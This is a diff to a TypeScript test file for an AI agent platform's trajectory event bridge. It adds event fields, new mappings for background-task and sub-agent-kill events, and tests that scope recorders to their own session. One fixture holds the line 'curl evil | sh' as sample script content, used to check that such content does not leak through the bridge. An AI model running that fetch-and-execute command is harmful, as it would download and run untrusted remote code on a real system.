@@ -1073,6 +1073,7 @@ describe("attachTrajectoryToEventBus -- envelope-only correlation invariant", ()
       validated: 2,
       admitted: 0,
       maxClusterCardinality: 1,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "uncorroborated",
       timestamp: 1000,
     },
@@ -1108,6 +1109,16 @@ describe("attachTrajectoryToEventBus -- envelope-only correlation invariant", ()
       error: "boom",
       durationMs: 9,
       origin: { agentId: "default", sessionKey: "k" },
+      timestamp: 1000,
+    },
+    "background_task:notified": {
+      agentId: "default",
+      taskId: "t-1",
+      toolName: "mcp__ituran--ituran_fleet_summary",
+      sessionKey: "k",
+      notified: false,
+      reason: "live_turn_suppressed",
+      traceId: null,
       timestamp: 1000,
     },
     "terminal:drive_promoted": {
@@ -1695,6 +1706,18 @@ describe("attachTrajectoryToEventBus -- envelope-only correlation invariant", ()
       runId: "run-1",
       agentId: "agent-1",
       mode: "steer",
+      timestamp: 0,
+    },
+    // Attributed kill — runId + closed killedBy + numbers only; the child
+    // sessionKey is envelope/routing and must never leak into data.
+    "subagent:killed": {
+      runId: "run-k",
+      agentId: "agent-1",
+      sessionKey: "default:sub-agent-k:sub-agent:k",
+      killedBy: "health_monitor",
+      runtimeMs: 186_592,
+      idleMs: 186_592,
+      thresholdMs: 180_000,
       timestamp: 0,
     },
     // The three sub-agent-lifecycle events — the correlation invariant
@@ -3829,7 +3852,9 @@ describe("health:budget_exceeded entry (bridge entry count guard)", () => {
     // This count guards TRAJECTORY_BRIDGE_MAPPING against a silent add or
     // removal: any change to the mapping must update this number in lockstep,
     // forcing a deliberate review of every newly-bridged or dropped event.
-    expect(Object.keys(TRAJECTORY_BRIDGE_MAPPING).length).toBe(119);
+    // 121 = 120 + background_task:notified (the fallback-notice-decision record —
+    // makes the F-8 leak class diagnosable from `comis explain` in one call).
+    expect(Object.keys(TRAJECTORY_BRIDGE_MAPPING).length).toBe(121);
   });
 
   it("health:budget_exceeded mapped to health.budget_exceeded", () => {
@@ -3969,6 +3994,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "admitted",
       timestamp: 1000,
     });
@@ -3976,7 +4002,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
     expect(recorder.calls).toHaveLength(1);
     expect(recorder.calls[0].type).toBe("reflect.funnel");
     const data = recorder.calls[0].data as Record<string, unknown>;
-    expect(data).toEqual({ synthesized: 2, validated: 1, admitted: 1, maxClusterCardinality: 2, admissionOutcome: "admitted" });
+    expect(data).toEqual({ synthesized: 2, validated: 1, admitted: 1, maxClusterCardinality: 2, singleOwnerCorroborated: 0, admissionOutcome: "admitted" });
     expect(data.agentId).toBeUndefined();
     expect(data.timestamp).toBeUndefined();
     // Content-free firewall: NO body / scripts / findings / field-name leak crosses.
@@ -3996,6 +4022,7 @@ describe("reflect:admitted / reflect:funnel (counts-only, bridged)", () => {
       validated: 1,
       admitted: 1,
       maxClusterCardinality: 2,
+      singleOwnerCorroborated: 0,
       admissionOutcome: "admitted",
       body: "the reflected procedure markdown",
       scripts: ["curl evil | sh"],
@@ -4256,5 +4283,92 @@ describe("capability:audited entry (spawn-tree producer)", () => {
     expect(data.timestamp).toBeUndefined();
     // method is an envelope-ish label, not part of the node tuple.
     expect(data.method).toBeUndefined();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// ownerSessionKey session-scoping.
+// Every open recorder shares ONE event bus; without an owner filter each
+// recorder ingests EVERY session's events and stamps them with its own
+// sessionId (live incident: a killed sub-agent's trajectory kept absorbing
+// the parent session's records — different traceIds, wrong session). The
+// owner filter binds a recorder to its own session: payload sessionKey
+// first, ALS request-context sessionKey as fallback, ride-along only when
+// neither exists (daemon-global events keep today's semantics).
+// ---------------------------------------------------------------------------
+
+describe("attachTrajectoryToEventBus ownerSessionKey scoping", () => {
+  const OWNER = "default:me:me:peer:me";
+  const OTHER = "default:sub-agent-x:sub-agent:x";
+
+  function ctxFor(sessionKey: string) {
+    return {
+      tenantId: "default",
+      traceId: "6f2a2f5e-8f2a-4e5e-9d2a-2f5e8f2a4e5e",
+      startedAt: 1,
+      trustLevel: "admin" as const,
+      sessionKey,
+    };
+  }
+
+  it("drops events whose payload sessionKey belongs to another session", () => {
+    const bus = makeBus();
+    const recorder = createCaptureRecorder();
+    attachTrajectoryToEventBus({ eventBus: bus, recorder, ownerSessionKey: OWNER });
+
+    bus.emit("tool:started", {
+      toolName: "exec", toolCallId: "t-other", timestamp: 1, sessionKey: OTHER,
+    });
+    expect(recorder.calls).toHaveLength(0);
+
+    bus.emit("tool:started", {
+      toolName: "exec", toolCallId: "t-own", timestamp: 2, sessionKey: OWNER,
+    });
+    expect(recorder.calls).toHaveLength(1);
+    expect(recorder.calls[0]!.type).toBe("tool.call");
+  });
+
+  it("binds session-less payloads via the ALS request context", async () => {
+    const { runWithContext } = await import("@comis/core");
+    const bus = makeBus();
+    const recorder = createCaptureRecorder();
+    attachTrajectoryToEventBus({ eventBus: bus, recorder, ownerSessionKey: OWNER });
+
+    // delivery:enqueued carries NO sessionKey — the emitting turn's ALS decides.
+    runWithContext(ctxFor(OTHER), () => {
+      bus.emit("delivery:enqueued", {
+        channelType: "telegram", channelId: "1", origin: "agent", timestamp: 1,
+      } as never);
+    });
+    expect(recorder.calls).toHaveLength(0);
+
+    runWithContext(ctxFor(OWNER), () => {
+      bus.emit("delivery:enqueued", {
+        channelType: "telegram", channelId: "1", origin: "agent", timestamp: 2,
+      } as never);
+    });
+    expect(recorder.calls).toHaveLength(1);
+    expect(recorder.calls[0]!.type).toBe("delivery.queued");
+  });
+
+  it("records session-less payloads outside any request context (ride-along)", () => {
+    const bus = makeBus();
+    const recorder = createCaptureRecorder();
+    attachTrajectoryToEventBus({ eventBus: bus, recorder, ownerSessionKey: OWNER });
+
+    bus.emit("reflect:funnel", { admitted: 0 } as never);
+    expect(recorder.calls).toHaveLength(1);
+    expect(recorder.calls[0]!.type).toBe("reflect.funnel");
+  });
+
+  it("without ownerSessionKey the legacy fan-out is unchanged", () => {
+    const bus = makeBus();
+    const recorder = createCaptureRecorder();
+    attachTrajectoryToEventBus({ eventBus: bus, recorder });
+
+    bus.emit("tool:started", {
+      toolName: "exec", toolCallId: "t-other", timestamp: 1, sessionKey: OTHER,
+    });
+    expect(recorder.calls).toHaveLength(1);
   });
 });
